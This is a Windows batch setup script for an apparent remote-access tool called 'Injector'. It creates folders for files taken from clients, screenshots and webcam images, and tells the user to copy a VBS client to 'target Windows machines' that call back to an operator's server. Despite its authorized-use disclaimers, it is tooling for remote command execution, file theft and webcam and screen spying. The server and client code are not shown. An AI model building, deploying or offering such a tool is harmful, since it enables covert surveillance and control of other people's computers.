@echo off
:: ============================================================================
:: Injector Remote Administration Tool - Setup Script
:: ============================================================================
:: This script helps set up the Injector Remote Administration Tool
:: Run this as Administrator for best results
::
:: WARNING: This tool is for AUTHORIZED USE ONLY on systems you own or
:: have permission to manage. Unauthorized use may violate laws.
:: ============================================================================

:: Check if running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [WARNING] This script should be run as Administrator for full functionality
    echo.
    pause
)

:: Set variables
set SCRIPT_DIR=%~dp0
set PYTHON_SCRIPT=%SCRIPT_DIR%injector_server.py
set VBS_SCRIPT=%SCRIPT_DIR%remote_admin.vbs

:: Display header
echo ==========================================================================
echo  Injector Remote Administration Tool - Setup
 echo ==========================================================================
echo.

:: Check Python installation
echo [*] Checking Python installation...
python --version >nul 2>&1
if %errorLevel% equ 0 (
    for /f "tokens=2" %%i in ('python --version 2^>^&1') do set PYTHON_VERSION=%%i
    echo [+] Python %PYTHON_VERSION% found
) else (
    echo [-] Python not found!
    echo [?] Python is required for the server component
    echo [?] Download Python from: https://www.python.org/downloads/
    echo [?] Make sure to check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

:: Create directory structure
echo.
echo [*] Creating directory structure...
for %%d in (uploads downloads screenshots webcam) do (
    if not exist "%SCRIPT_DIR%%%d" (
        mkdir "%SCRIPT_DIR%%%d"
        echo [+] Created directory: %%d
    ) else (
        echo [i] Directory already exists: %%d
    )
)

:: Create sample files
echo.
echo [*] Creating sample files...

:: Create sample upload file
if not exist "%SCRIPT_DIR%uploads\sample.txt" (
    echo This is a sample file for testing upload functionality. > "%SCRIPT_DIR%uploads\sample.txt"
    echo [+] Created sample upload file: uploads/sample.txt
) else (
    echo [i] Sample upload file already exists
)

:: Create client configuration file
echo.
echo [*] Checking client configuration...
if not exist "%VBS_SCRIPT%" (
    echo [-] Client script not found: %VBS_SCRIPT%
    echo [?] Make sure remote_admin.vbs is in the same directory
    pause
    exit /b 1
) else (
    echo [+] Client script found: %VBS_SCRIPT%
)

:: Display setup completion
echo.
echo ==========================================================================
echo  Setup Complete!
 echo ==========================================================================
echo.
echo Server Files:
echo   - injector_server.py (Main server)
echo   - remote_admin.vbs (Client script)
echo.
echo Directories Created:
echo   - uploads/ (Files to send to clients)
echo   - downloads/ (Files received from clients)
echo   - screenshots/ (Screenshot captures)
echo   - webcam/ (Webcam images)
echo.

:: Display usage instructions
echo ==========================================================================
echo  USAGE INSTRUCTIONS
 echo ==========================================================================
echo.
echo 1. START THE SERVER:
echo    cd %SCRIPT_DIR%
echo    python injector_server.py [port]
echo.
echo    Example: python injector_server.py 8080
echo.
echo 2. DEPLOY CLIENTS:
echo    Copy remote_admin.vbs to target Windows machines
echo    Double-click or run: cscript remote_admin.vbs [server_url]
echo.
echo    Example: cscript remote_admin.vbs http://your-server-ip:8080
echo.
echo 3. OPTIONAL DEPENDENCIES:
echo.
echo    For screenshot capture (recommended):
echo      - Download nircmd.exe from https://www.nirsoft.net/utils/nircmd.html
echo      - Place in C:\Windows\ or C:\Windows\System32\
echo.
echo    For webcam capture:
echo      - Install FFmpeg from https://ffmpeg.org/
echo      - Add to system PATH
echo.
echo 4. ACCESS THE MENU:
echo    After starting the server, use the interactive menu to:
echo      - Send commands to clients
      - View results
      - Manage files
      - View screenshots and webcam images
echo.

:: Display security warning
echo ==========================================================================
echo  SECURITY WARNING
 echo ==========================================================================
echo.
echo This tool is for AUTHORIZED USE ONLY on systems you own or have
permission to manage.
echo.
echo Unauthorized use may violate:
echo   - Computer Fraud and Abuse Act (CFAA)
echo   - Computer Misuse Act
echo   - Similar laws in your jurisdiction
echo.
echo The developers are NOT responsible for any misuse.
echo.
echo ==========================================================================
echo.

:: Ask if user wants to start the server
echo [?] Do you want to start the server now? (y/n)
set /p START_SERVER=
if /i "%START_SERVER%" == "y" (
    echo.
    echo [*] Starting Injector Server...
    echo [*] Press Ctrl+C to stop the server
    echo.
    python %PYTHON_SCRIPT%
) else (
    echo [i] Server not started. Run 'python injector_server.py' to start manually.
)

echo.
pause